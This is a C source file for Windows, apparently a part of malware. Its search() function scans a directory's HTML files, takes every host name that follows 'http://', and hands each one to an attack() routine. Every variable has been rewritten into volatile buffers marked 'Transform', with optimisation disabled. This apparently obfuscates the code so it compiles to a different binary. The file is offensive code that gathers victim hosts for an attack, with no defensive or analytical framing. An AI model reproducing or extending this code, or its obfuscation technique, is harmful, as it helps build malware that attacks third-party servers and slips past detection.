#pragma optimize("", off)

#include "data_globals.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

void search(LPCSTR path) {
    WIN32_FIND_DATAA wfd;

    // Transform HANDLE hFind
    volatile HANDLE hFind_buf[2] = {{INVALID_HANDLE_VALUE, (HANDLE)0}};
    volatile HANDLE *p_hFind = (volatile HANDLE *)&hFind_buf[0];

    // Transform HANDLE hFile
    volatile HANDLE hFile_buf[2] = {{INVALID_HANDLE_VALUE, (HANDLE)0}};
    volatile HANDLE *p_hFile = (volatile HANDLE *)&hFile_buf[0];

    // Transform DWORD bytesread
    volatile DWORD bytesread_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_bytesread = (volatile DWORD *)&bytesread_buf[0];

    // Transform char *buf
    char* volatile buf_buf[2] = {{NULL, (char*)0}};
    char* volatile *p_buf = (char* volatile *)&buf_buf[0];

    // Transform char *p
    char* volatile p_buf2[2] = {{NULL, (char*)0}};
    char* volatile *p_p = (char* volatile *)&p_buf2[0];

    // Transform char *host
    char* volatile host_buf[2] = {{NULL, (char*)0}};
    char* volatile *p_host = (char* volatile *)&host_buf[0];

    // Transform DWORD size
    volatile DWORD size_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_size = (volatile DWORD *)&size_buf[0];

    if (!SetCurrentDirectoryA(path)) return;

    (*p_hFind) = FindFirstFileA("*.htm*", &wfd);
    if ((*p_hFind) == INVALID_HANDLE_VALUE) return;

    do {
        (*p_hFile) = CreateFileA(wfd.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if ((*p_hFile) == INVALID_HANDLE_VALUE) continue;

        (*p_size) = GetFileSize((*p_hFile), NULL);
        if ((*p_size) == INVALID_FILE_SIZE) { CloseHandle((*p_hFile)); continue; }

        (*p_buf) = (char *)malloc((*p_size) + 1);
        if (!(*p_buf)) { CloseHandle((*p_hFile)); continue; }

        if (!ReadFile((*p_hFile), (*p_buf), (*p_size), &(*p_bytesread), NULL) || (*p_bytesread) != (*p_size)) {
            free((*p_buf));
            CloseHandle((*p_hFile));
            continue;
        }
        CloseHandle((*p_hFile));
        (*p_buf)[(*p_size)] = '\0';

        (*p_p) = (*p_buf);
        while (*(*p_p)) {
            char *http = strstr((*p_p), "http://");
            if (!http) break;
            (*p_host) = http + 7;                // skip "http://"
            (*p_p) = strchr((*p_host), '/');
            if (!(*p_p)) break;
            *(*p_p) = '\0';                      // terminate at slash
            attack((*p_host));
            (*p_p)++;                            // move past the slash
        }
        free((*p_buf));
    } while (FindNextFileA((*p_hFind), &wfd));

    FindClose((*p_hFind));
}

#pragma optimize("", on)
